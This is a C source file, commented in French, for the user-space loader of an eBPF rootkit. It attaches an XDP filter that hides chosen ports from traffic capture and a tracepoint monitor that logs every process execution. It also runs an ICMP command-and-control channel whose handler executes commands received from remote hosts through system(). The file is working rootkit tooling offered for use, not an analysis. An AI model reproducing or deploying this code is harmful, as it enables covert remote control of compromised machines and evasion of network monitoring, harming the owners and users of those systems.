/* SPDX-License-Identifier: GPL-2.0 */
/*
 * rk_ebpf_loader — Chargeur eBPF pour le rootkit
 *
 * Charge et gere les 3 programmes eBPF :
 *   1. XDP packet hiding  (xdp_hide.bpf.o)
 *   2. Exec monitor       (exec_monitor.bpf.o)
 *   3. ICMP C2 channel    (icmp_c2.bpf.o)
 *
 * Usage :
 *   ./rk_ebpf_loader <commande> [args]
 *
 * Commandes :
 *   xdp_attach <iface>           Attacher le filtre XDP sur une interface
 *   xdp_detach <iface>           Detacher le filtre XDP
 *   xdp_hide_port <port>         Ajouter un port a cacher
 *   xdp_unhide_port <port>       Retirer un port cache
 *   xdp_enable                   Activer le filtre XDP
 *   xdp_disable                  Desactiver le filtre XDP
 *
 *   exec_attach                  Attacher le moniteur d'execution
 *   exec_detach                  Detacher le moniteur
 *   exec_enable                  Activer le moniteur
 *   exec_disable                 Desactiver le moniteur
 *   exec_watch                   Afficher les executions en temps reel
 *
 *   c2_attach <iface>            Attacher le canal C2 ICMP
 *   c2_detach <iface>            Detacher le canal C2
 *   c2_enable                    Activer le canal C2
 *   c2_disable                   Desactiver le canal C2
 *   c2_watch                     Ecouter les commandes C2
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include <linux/if_link.h>
#include "rk_bpf_common.h"

static volatile int running = 1;

static void sig_handler(int sig)
{
    (void)sig;
    running = 0;
}

/* ================================================================
 * Helpers generiques
 * ================================================================ */


/* ================================================================
 * XDP Packet Hiding
 * ================================================================ */

static int xdp_attach(const char *iface)
{
    struct bpf_object *obj;
    struct bpf_program *prog;
    int ifindex, prog_fd, err;

    ifindex = if_nametoindex(iface);
    if (!ifindex) {
        fprintf(stderr, "Interface %s introuvable\n", iface);
        return -1;
    }

    obj = bpf_object__open("xdp_hide.bpf.o");
    if (!obj) {
        perror("bpf_object__open xdp_hide");
        return -1;
    }

    err = bpf_object__load(obj);
    if (err) {
        fprintf(stderr, "Erreur chargement xdp_hide: %d\n", err);
        bpf_object__close(obj);
        return -1;
    }

    prog = bpf_object__find_program_by_name(obj, "xdp_hide_packets");
    if (!prog) {
        fprintf(stderr, "Programme xdp_hide_packets introuvable\n");
        bpf_object__close(obj);
        return -1;
    }
    prog_fd = bpf_program__fd(prog);

    /* Pin les maps pour usage futur */
    struct bpf_map *map;
    map = bpf_object__find_map_by_name(obj, "hidden_ports");
    if (map) bpf_map__pin(map, "/sys/fs/bpf/hidden_ports");
    map = bpf_object__find_map_by_name(obj, "xdp_enabled");
    if (map) bpf_map__pin(map, "/sys/fs/bpf/xdp_enabled");

    err = bpf_xdp_attach(ifindex, prog_fd, XDP_FLAGS_SKB_MODE, NULL);
    if (err) {
        fprintf(stderr, "Erreur attachement XDP sur %s: %d\n", iface, err);
        bpf_object__close(obj);
        return -1;
    }

    printf("XDP packet hiding attache sur %s (ifindex=%d)\n", iface, ifindex);
    /* Note: on ne ferme pas obj pour garder le prog charge.
       En production on pinnerait le prog aussi. */
    bpf_object__close(obj);
    return 0;
}

static int xdp_detach(const char *iface)
{
    int ifindex = if_nametoindex(iface);
    if (!ifindex) {
        fprintf(stderr, "Interface %s introuvable\n", iface);
        return -1;
    }
    int err = bpf_xdp_detach(ifindex, XDP_FLAGS_SKB_MODE, NULL);
    if (err) {
        fprintf(stderr, "Erreur detachement XDP: %d\n", err);
        return -1;
    }
    /* Cleanup pinned maps */
    unlink("/sys/fs/bpf/hidden_ports");
    unlink("/sys/fs/bpf/xdp_enabled");
    printf("XDP detache de %s\n", iface);
    return 0;
}

static int xdp_hide_port(__u16 port)
{
    int map_fd = bpf_obj_get("/sys/fs/bpf/hidden_ports");
    if (map_fd < 0) {
        fprintf(stderr, "Map hidden_ports introuvable — XDP attache ?\n");
        return -1;
    }
    __u8 val = 1;
    bpf_map_update_elem(map_fd, &port, &val, BPF_ANY);
    close(map_fd);
    printf("Port %u cache du trafic capture\n", port);
    return 0;
}

static int xdp_unhide_port(__u16 port)
{
    int map_fd = bpf_obj_get("/sys/fs/bpf/hidden_ports");
    if (map_fd < 0) {
        fprintf(stderr, "Map hidden_ports introuvable\n");
        return -1;
    }
    bpf_map_delete_elem(map_fd, &port);
    close(map_fd);
    printf("Port %u visible a nouveau\n", port);
    return 0;
}

static int xdp_set_enabled(__u8 val)
{
    int map_fd = bpf_obj_get("/sys/fs/bpf/xdp_enabled");
    if (map_fd < 0) {
        fprintf(stderr, "Map xdp_enabled introuvable — XDP attache ?\n");
        return -1;
    }
    __u32 key = 0;
    bpf_map_update_elem(map_fd, &key, &val, BPF_ANY);
    close(map_fd);
    printf("Filtre XDP %s\n", val ? "active" : "desactive");
    return 0;
}

/* ================================================================
 * Exec Monitor
 * ================================================================ */

static int exec_event_handler(void *ctx, void *data, size_t size)
{
    (void)ctx;
    (void)size;
    struct exec_event *evt = data;
    printf("[EXEC] pid=%-6u uid=%-5u ppid=%-6u comm=%-16s file=%s\n",
           evt->pid, evt->uid, evt->ppid, evt->comm, evt->filename);
    return 0;
}

static int exec_attach_and_watch(int watch)
{
    struct bpf_object *obj;
    struct bpf_program *prog;
    struct bpf_link *link = NULL;
    int err;

    obj = bpf_object__open("exec_monitor.bpf.o");
    if (!obj) {
        perror("bpf_object__open exec_monitor");
        return -1;
    }
    err = bpf_object__load(obj);
    if (err) {
        fprintf(stderr, "Erreur chargement exec_monitor: %d\n", err);
        bpf_object__close(obj);
        return -1;
    }

    /* Activer par defaut */
    struct bpf_map *en_map = bpf_object__find_map_by_name(obj, "exec_enabled");
    if (en_map) {
        __u32 key = 0;
        __u8 val = 1;
        bpf_map_update_elem(bpf_map__fd(en_map), &key, &val, BPF_ANY);
        bpf_map__pin(en_map, "/sys/fs/bpf/exec_enabled");
    }

    prog = bpf_object__find_program_by_name(obj, "trace_exec");
    if (!prog) {
        fprintf(stderr, "Programme trace_exec introuvable\n");
        bpf_object__close(obj);
        return -1;
    }

    link = bpf_program__attach(prog);
    if (!link) {
        fprintf(stderr, "Erreur attachement tracepoint\n");
        bpf_object__close(obj);
        return -1;
    }

    printf("Moniteur d'execution attache\n");

    if (!watch) {
        /* Just attach and exit — pin the link for persistence */
        printf("(mode attach seul — utilisez exec_watch pour voir les evenements)\n");
        /* In a real scenario we'd pin the link; for simplicity, keep running */
    }

    if (watch) {
        struct bpf_map *rb_map = bpf_object__find_map_by_name(obj, "exec_events");
        if (!rb_map) {
            fprintf(stderr, "Ring buffer exec_events introuvable\n");
            bpf_link__destroy(link);
            bpf_object__close(obj);
            return -1;
        }

        struct ring_buffer *rb = ring_buffer__new(bpf_map__fd(rb_map),
                                                   exec_event_handler,
                                                   NULL, NULL);
        if (!rb) {
            fprintf(stderr, "Erreur creation ring buffer\n");
            bpf_link__destroy(link);
            bpf_object__close(obj);
            return -1;
        }

        signal(SIGINT, sig_handler);
        signal(SIGTERM, sig_handler);
        printf("Ecoute des executions (Ctrl+C pour arreter)...\n");

        while (running) {
            ring_buffer__poll(rb, 100);
        }

        ring_buffer__free(rb);
    } else {
        /* Keep alive until signal */
        signal(SIGINT, sig_handler);
        signal(SIGTERM, sig_handler);
        printf("Appuyez Ctrl+C pour detacher...\n");
        while (running)
            sleep(1);
    }

    unlink("/sys/fs/bpf/exec_enabled");
    bpf_link__destroy(link);
    bpf_object__close(obj);
    printf("\nMoniteur d'execution detache\n");
    return 0;
}

/* ================================================================
 * ICMP C2 Channel
 * ================================================================ */

static int icmp_cmd_handler(void *ctx, void *data, size_t size)
{
    (void)ctx;
    (void)size;
    struct icmp_cmd_event *evt = data;

    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &evt->src_ip, ip_str, sizeof(ip_str));

    printf("[C2] src=%s cmd=\"%s\"\n", ip_str, evt->cmd);

    /* Executer la commande recue */
    printf("[C2] Execution: %s\n", evt->cmd);
    int ret = system(evt->cmd);
    printf("[C2] Code retour: %d\n", ret);

    return 0;
}

static int c2_attach_and_watch(const char *iface, int watch)
{
    struct bpf_object *obj;
    struct bpf_program *prog;
    int ifindex, prog_fd, err;

    ifindex = if_nametoindex(iface);
    if (!ifindex) {
        fprintf(stderr, "Interface %s introuvable\n", iface);
        return -1;
    }

    obj = bpf_object__open("icmp_c2.bpf.o");
    if (!obj) {
        perror("bpf_object__open icmp_c2");
        return -1;
    }
    err = bpf_object__load(obj);
    if (err) {
        fprintf(stderr, "Erreur chargement icmp_c2: %d\n", err);
        bpf_object__close(obj);
        return -1;
    }

    /* Activer par defaut */
    struct bpf_map *en_map = bpf_object__find_map_by_name(obj, "icmp_c2_enabled");
    if (en_map) {
        __u32 key = 0;
        __u8 val = 1;
        bpf_map_update_elem(bpf_map__fd(en_map), &key, &val, BPF_ANY);
        bpf_map__pin(en_map, "/sys/fs/bpf/icmp_c2_enabled");
    }

    prog = bpf_object__find_program_by_name(obj, "xdp_icmp_c2");
    if (!prog) {
        fprintf(stderr, "Programme xdp_icmp_c2 introuvable\n");
        bpf_object__close(obj);
        return -1;
    }
    prog_fd = bpf_program__fd(prog);

    /* Pin ring buffer map */
    struct bpf_map *rb_map = bpf_object__find_map_by_name(obj, "icmp_cmd_events");
    if (rb_map)
        bpf_map__pin(rb_map, "/sys/fs/bpf/icmp_cmd_events");

    err = bpf_xdp_attach(ifindex, prog_fd, XDP_FLAGS_SKB_MODE, NULL);
    if (err) {
        fprintf(stderr, "Erreur attachement XDP C2 sur %s: %d\n", iface, err);
        bpf_object__close(obj);
        return -1;
    }

    printf("Canal C2 ICMP attache sur %s\n", iface);

    if (watch && rb_map) {
        struct ring_buffer *rb = ring_buffer__new(bpf_map__fd(rb_map),
                                                   icmp_cmd_handler,
                                                   NULL, NULL);
        if (!rb) {
            fprintf(stderr, "Erreur creation ring buffer C2\n");
            goto cleanup;
        }

        signal(SIGINT, sig_handler);
        signal(SIGTERM, sig_handler);
        printf("Ecoute des commandes C2 ICMP (Ctrl+C pour arreter)...\n");

        while (running) {
            ring_buffer__poll(rb, 100);
        }
        ring_buffer__free(rb);
    } else {
        signal(SIGINT, sig_handler);
        signal(SIGTERM, sig_handler);
        printf("Appuyez Ctrl+C pour detacher...\n");
        while (running)
            sleep(1);
    }

cleanup:
    bpf_xdp_detach(ifindex, XDP_FLAGS_SKB_MODE, NULL);
    unlink("/sys/fs/bpf/icmp_c2_enabled");
    unlink("/sys/fs/bpf/icmp_cmd_events");
    bpf_object__close(obj);
    printf("\nCanal C2 ICMP detache de %s\n", iface);
    return 0;
}

/* ================================================================
 * Main
 * ================================================================ */

static void usage(const char *prog)
{
    printf("Usage: %s <commande> [args]\n\n", prog);
    printf("XDP Packet Hiding:\n");
    printf("  xdp_attach <iface>      Attacher le filtre XDP\n");
    printf("  xdp_detach <iface>      Detacher le filtre XDP\n");
    printf("  xdp_hide_port <port>    Cacher un port du trafic\n");
    printf("  xdp_unhide_port <port>  Rendre un port visible\n");
    printf("  xdp_enable              Activer le filtre\n");
    printf("  xdp_disable             Desactiver le filtre\n");
    printf("\nExec Monitor:\n");
    printf("  exec_watch              Surveiller les executions en temps reel\n");
    printf("  exec_attach             Attacher le moniteur sans affichage\n");
    printf("\nICMP C2 Channel:\n");
    printf("  c2_watch <iface>        Ecouter les commandes C2 sur une interface\n");
    printf("  c2_attach <iface>       Attacher le C2 sans ecoute\n");
    printf("  c2_detach <iface>       Detacher le C2\n");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        usage(argv[0]);
        return 1;
    }

    /* XDP Packet Hiding */
    if (strcmp(argv[1], "xdp_attach") == 0 && argc >= 3)
        return xdp_attach(argv[2]);

    if (strcmp(argv[1], "xdp_detach") == 0 && argc >= 3)
        return xdp_detach(argv[2]);

    if (strcmp(argv[1], "xdp_hide_port") == 0 && argc >= 3)
        return xdp_hide_port((__u16)atoi(argv[2]));

    if (strcmp(argv[1], "xdp_unhide_port") == 0 && argc >= 3)
        return xdp_unhide_port((__u16)atoi(argv[2]));

    if (strcmp(argv[1], "xdp_enable") == 0)
        return xdp_set_enabled(1);

    if (strcmp(argv[1], "xdp_disable") == 0)
        return xdp_set_enabled(0);

    /* Exec Monitor */
    if (strcmp(argv[1], "exec_watch") == 0)
        return exec_attach_and_watch(1);

    if (strcmp(argv[1], "exec_attach") == 0)
        return exec_attach_and_watch(0);

    /* ICMP C2 */
    if (strcmp(argv[1], "c2_watch") == 0 && argc >= 3)
        return c2_attach_and_watch(argv[2], 1);

    if (strcmp(argv[1], "c2_attach") == 0 && argc >= 3)
        return c2_attach_and_watch(argv[2], 0);

    if (strcmp(argv[1], "c2_detach") == 0 && argc >= 3) {
        int ifindex = if_nametoindex(argv[2]);
        if (!ifindex) {
            fprintf(stderr, "Interface %s introuvable\n", argv[2]);
            return -1;
        }
        bpf_xdp_detach(ifindex, XDP_FLAGS_SKB_MODE, NULL);
        unlink("/sys/fs/bpf/icmp_c2_enabled");
        unlink("/sys/fs/bpf/icmp_cmd_events");
        printf("C2 detache de %s\n", argv[2]);
        return 0;
    }

    usage(argv[0]);
    return 1;
}
